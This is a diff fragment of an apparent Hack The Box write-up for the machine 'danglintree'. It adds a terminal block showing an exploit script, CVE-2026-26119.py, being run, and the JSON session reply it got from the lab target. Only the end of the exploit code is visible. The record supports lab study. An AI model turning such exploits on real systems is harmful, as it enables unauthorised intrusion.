@@ -568,3 +568,13 @@ if __name__ == "__main__":
          explotation(session)
 
 ```
+
+``` bash
+
+❯ python3 CVE-2026-26119.py
+202
+{"sessionId":"719a9b7f-d26d-4125-b8bf-e688e71af8df","completed":"False","results":[],"errors":null,"exception":null,"progress":[{"activityId":0,"parentActivityId":-1,"activity":"Preparing modules for first use.","statusDescription":" ","currentOperation":null,"percentComplete":-1,"secondsRemaining":-1,"recordType":"Completed"}],"warnings":null,"statusCode":0}
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                              ✔ │ 11s ─╮
+╰─                                                                                                                   ─╯
+
+```
